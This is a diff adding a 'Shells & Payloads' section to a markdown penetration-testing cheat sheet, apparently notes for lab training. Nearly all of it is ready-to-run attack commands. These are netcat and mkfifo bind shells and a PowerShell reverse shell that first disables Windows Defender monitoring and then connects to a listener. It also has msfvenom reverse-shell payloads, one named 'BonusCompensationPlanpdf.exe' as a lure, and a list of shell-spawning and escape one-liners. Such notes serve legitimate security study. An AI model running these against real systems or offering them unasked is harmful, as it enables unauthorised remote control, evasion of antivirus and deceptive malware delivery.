@@ -557,9 +557,114 @@ ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/S
 
 # Vulnerability Assessment
 
-# File Transfers
-
 # Shells & Payloads
+## Bind Shell
+### Netcat
+#### Start Netcat Listener on Target Machine
+```
+nc -lvnp 7777
+```
+#### Connect to the Target Machine
+```
+nc -nv 10.129.41.200 7777
+```
+### Binding a Bash Shell to TCP
+#### Start the Listener
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
+#### Connect to the Target
+```
+nc -nv 10.129.41.200 7777
+```
+
+## Reverse Shell
+### Netcat
+#### Start the Listener on the Attacking Machine
+```
+nc -lvnp 443
+```
+#### Connect to the Attacking Machine (Powershell)
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+```
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+```
+
+## Payloads
+### MSFVenom
+#### List Payloads
+```
+msfvenom -l payloads
+```
+#### Building a Stageless Payload Linux
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+```
+#### Building a Stageless Payload Windows
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+```
+#### Start the Listener
+```
+nc -lvnp 443
+```
+
+## Windows Shells
+
+## NIX Shells
+### Spawn an Interactive Python TTY Shell
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+### /bin/sh
+```
+/bin/sh -i
+```
+### Perl
+```
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+```
+### Ruby
+```
+ruby: exec "/bin/sh"
+```
+### lua
+```
+lua: os.execute('/bin/sh')
+```
+### awk
+```
+awk 'BEGIN {system("/bin/sh")}'
+```
+### find
+```
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+### Exec
+```
+find . -exec /bin/sh \; -quit
+```
+### vim
+```
+vim -c ':!/bin/sh'
+```
+### vim escape
+```
+vim
+:set shell=/bin/sh
+:shell
+```
+## Check permissions
+```
+ls -lah /path/to/binary
+sudo -l
+```
+
+## Web Shells
 
 # Password Attacks
 
